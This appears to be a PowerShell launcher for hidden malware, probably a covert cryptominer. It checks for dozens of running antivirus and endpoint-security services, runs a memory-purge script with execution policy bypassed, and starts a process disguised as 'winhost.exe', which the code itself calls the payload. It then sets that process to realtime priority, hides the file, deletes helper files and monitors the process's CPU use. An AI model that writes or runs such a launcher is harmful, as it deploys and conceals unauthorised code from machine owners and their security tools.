function Get-AV {
$AVSvc = 'ESM Endpoint','Dell PBA','Warsaw Technology','OfficeScan', 'Huorong','QQPCMgr','Client Agent','SentinelOne','Cybereason','Kingsoft Core','eScan','Acronis Ransomware','Huorong','QQPCMgr','CompLogic','Sybereason','VIPRE','Naver','AhnLab','G DATA','N-able','F-Secure','K7Real','Endpoint ','Safedog','Trend Micro','Avira', 'MBAB', 'Microsoft Anti', 'estsoft', 'netflow', 'Bitdefender', 'Norton', 'Kaspersky', 'ESET', 'Panda', '360', 'AVG', 'webroot', 'Avast', 'Symantec', 'protection', 'antimalware', 'Windows Defender', 'McAfee','V3 ', 'Traps', 'Panda', 'Sophos'
$f=0
$console.BackgroundColor = "Green"
cls
    $AVSvc | % { Get-Service -DisplayName $_* | Where-Object {$_.Status -match 'Running'} | % { Write-Host $_.DisplayName`t -f White -b DarkRed; $f++ } }
    if (!$f) {return}
	Start-Sleep 2
}
function prep-mem {
    start  $PsHome\powershell.exe " -ExecutionPolicy Bypass -File purgeMemory.ps1" 
    start NS2.exe
}

function StartPro($destine) {
cls
Write-Host ...Starting the payload
    $psid = (Start-Process $destine -PassThru).Id
    Write-Host Id: $psid -ForegroundColor Yellow
    Start-Sleep 1
    if (Get-Process -Id $psid -ErrorAction SilentlyContinue) {
        Write-Host ...elevating priority
        (get-process -Id $psid).PriorityClass = 'realtime'
        Write-Host ...hiding the file
        (Get-Item $destine).Attributes="Hidden"
        return $psid
    }
    else {
        Write-Host THE PROCESS FAILED TO RUN. AV problem?
        Start-Sleep 3
        StartPro
    }
}
function Start-Update($psid) {
    # v.1.1 2018.05.08
    $console = $host.UI.RawUI
    $console.WindowTitle = "Process monitor window "+$psid
    $size = $console.WindowSize
    $size.Width = 28
    $size.Height = 4
    $console.WindowSize = $size
    $buffer = $console.BufferSize
    $buffer.Width = 28
    $buffer.Height = 4
    $console.BufferSize = $buffer
    Clear-Host
    $questPos = $console.CursorPosition
    $prevT = Get-Date

    While (1) {  
    $oneSec = [int]((Get-Date) - $prevT).TotalMilliseconds
    $prevT = Get-Date
        $proc = (Get-Process -Id $psid -ErrorAction SilentlyContinue).CPU
        $console.CursorPosition = $questPos
        if ($prevProc -eq $null -and $proc -ne $null) {
            $console.ForegroundColor = "Black"
            $console.BackgroundColor = "Green"
            Clear-Host
        }
        elseif ($prevProc -ne $null -and  $proc -eq $null) {
            $console.ForegroundColor = "White"
            $console.BackgroundColor = "Red"
            Clear-Host
        }
        if ($proc) {
            $procPerc = [int](($proc - $prevProc) * 10000000 / $oneSec) / 100
            Write-Host "CPU `t`t`t`n$proc `n$procPerc %`t`t"
            $prevProc = $proc
        }
        else {
            Write-Host "NO PROCESS RUNNING? :-(`t`n`t`t`t"
            $prevProc = $null
        }
        Start-Sleep -Seconds 1 
    }
}
####

$console = $host.UI.RawUI
$console.WindowTitle = "Running the process v.2.0.1 11.01.2019"

$console.ForegroundColor = "White"
$console.BackgroundColor = "Cyan"

Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")] 
public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")]
public static extern bool MoveWindow(IntPtr hWnd, int X, int Y, int W, int H); '
$consoleHWND = [Console.Window]::GetConsoleWindow();
[Console.Window]::MoveWindow($consoleHWND,0,0,460,260) | Out-Null;

Get-AV
prep-mem
$ScriptDir = Split-Path $script:MyInvocation.MyCommand.Path
Set-Location $ScriptDir
Remove-Item - Takeaway*, purgeMem*
$destine = "winhost.exe"
$psid = StartPro($destine)
echo $psid
Start-Update($psid)

